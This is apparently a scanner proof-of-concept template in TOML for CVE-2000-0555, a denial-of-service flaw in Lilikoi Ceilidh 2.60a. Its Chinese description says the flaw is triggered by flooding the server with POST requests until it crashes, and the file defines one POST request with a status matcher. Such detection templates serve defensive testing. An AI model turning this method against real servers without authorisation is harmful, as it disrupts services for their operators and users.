[info]
author = "ave"
description = "检测 Lilikoi Ceilidh 2.60a 是否存在拒绝服务漏洞。通过发送大量 POST 请求耗尽服务端资源导致崩溃"
id = "POC-AVE-2000-0643"
name = "CVE-2000-0555 Ceilidh POST DoS PoC"
severity = "medium"
tags = ["ave-2000-0643"]
vuln_id = [
    "CVE-2000-0555",
    "AVE-2000-0643",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    302,
]
type = "status"
